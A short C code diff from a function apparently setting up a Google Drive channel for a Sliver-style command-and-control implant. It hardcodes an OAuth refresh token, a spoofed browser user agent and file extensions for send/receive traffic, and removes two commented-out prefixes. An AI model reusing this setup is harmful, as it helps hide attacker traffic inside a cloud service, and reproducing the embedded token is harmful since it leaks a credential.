@@ -53,8 +53,6 @@ PSLIVER_DRIVE_CLIENT DriveInit()
 	CHAR szRefreshToken[] = "1//04U3_Gum8qlGvCgYIARAAGAQSNwF-L9IrmGLxFDUJTcb8IGojFuflKaNFqpQolUQI8ANjXIbrKe0Fq_7VzJUnt0hba15FOoUCJig";
 	CHAR szUserAgent[] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.9265.982 Safari/537.36";
 	DWORD i = 0;
-	/*CHAR szRecvPrefix[] = "gocspx";
-	CHAR szSendPrefix[] = "age52";*/
 	CHAR szStartExtension[] = "coffee";
 	CHAR szSendExtension[] = "vsx";
 	CHAR szRecvExtension[] = "_sln160";
